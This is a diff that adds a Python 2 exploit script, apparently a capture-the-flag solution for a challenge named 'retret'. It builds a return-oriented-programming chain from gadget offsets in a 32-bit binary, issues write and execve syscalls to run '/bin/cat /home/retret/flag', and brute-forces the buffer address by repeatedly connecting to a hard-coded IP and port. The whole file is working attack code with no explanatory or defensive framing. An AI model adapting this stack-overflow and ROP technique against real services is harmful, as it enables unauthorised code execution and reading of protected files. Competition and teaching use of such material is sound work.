@@ -1,0 +1,98 @@
+from socket import *
+from time import sleep
+from select import select
+import struct
+import sys
+
+# dummy is fixed
+dummy = 0x08048537
+# aligned buffer is somewhere around here
+aligned = 0x0804a000
+
+# dummy+29: cd 80 c3 int 0x80
+# dummy+59: 58 59 c3 pop eax pop ecx
+# dummy+97: 87 d9 c3 xchg ecx, ebx
+# dummy+130: 5a c3 pop edx
+
+def le(addr):
+    return struct.pack('<I', addr)
+
+def set_eax_ecx(eax, ecx):
+    return le(dummy+59) + le(eax) + le(ecx)
+
+def set_ecx(ecx):
+    return le(dummy+60) + le(ecx)
+
+def xchg_ecx_ebx():
+    return le(dummy+97)
+
+def set_edx(edx):
+    return le(dummy+130) + le(edx)
+
+def int0x80():
+    return le(dummy+29)
+
+def testStr():
+    buf = ""
+    # string argument for syscall
+    buf += "/bin/cat\x00/home/retret/flag\x00"
+    buf += le(aligned)
+    buf += le(aligned+9)
+    buf += le(0)
+    buf += "A" * (0x1004 - len(buf))
+
+    # print syscall to verify
+    buf += set_eax_ecx(4, 1)
+    buf += xchg_ecx_ebx()
+    buf += set_ecx(aligned)
+    buf += set_edx(100)
+    buf += int0x80()
+
+    # execve syscall to cat flag
+    buf += set_eax_ecx(11, aligned)
+    buf += xchg_ecx_ebx()
+    buf += set_ecx(aligned+27)
+    buf += set_edx(aligned+35)
+    buf += int0x80()
+
+    # fill rest of byte with "A"
+    rest = 0x2000 - len(buf)
+    if rest > 0:
+        buf += "A" * rest
+
+    return buf
+
+
+while 1:
+    print "start" 
+    # repeat infinitly and check if the flag is out
+    aligned = 0x8048000
+    while aligned < 0x8f00000:
+        s = socket(AF_INET, SOCK_STREAM)
+        if s.connect_ex(("143.248.38.212", 40005)) > 0:
+            print "Fail to connect"
+            break
+
+        _, w, _ = select([], [s], [])
+        if s in w:
+            b = s.send(testStr())
+
+        r, _, _ = select([s], [], [], 0.1)
+        if s in r:
+            try:
+                data = s.recv(10000)
+                if data:
+                    print hex(aligned)
+                    print len(data), data.encode("hex")
+                    print data
+                    if len(data) < 101:
+                        data = s.recv(10000)
+                        print len(data), data.encode("hex")
+                        print data
+            except error as e:
+                print e
+        sleep(0.01)
+
+        # try other address
+        aligned += 0x1000
+        s.close()
